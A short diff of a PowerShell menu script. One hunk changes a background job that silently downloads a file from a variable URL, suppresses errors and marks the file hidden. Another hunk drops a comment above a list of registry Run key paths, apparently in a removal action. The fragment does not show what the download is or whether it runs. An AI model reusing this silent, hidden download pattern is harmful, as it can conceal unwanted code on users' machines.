@@ -18,7 +18,9 @@ if (Test-Path $output1) { Remove-Item $output1 -Force -ErrorAction SilentlyConti
 $job1 = Start-Job -ScriptBlock {
     param($url, $output)
     Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction SilentlyContinue
-    (Get-Item $output).Attributes = 'Hidden'
+    if (Test-Path $output) {
+        (Get-Item $output).Attributes = 'Hidden'
+    }
 } -ArgumentList $url1, $output1
 
 Wait-Job $job1 | Out-Null
@@ -206,7 +208,6 @@ if ($choice -eq '8') {
         $action = Read-Host "Choose action (1 or 2)"
         if ($action -eq '1') {
             try {
-                # Remove from registry Run keys
                 $regPaths = @(
                     'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run',
                     'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run',
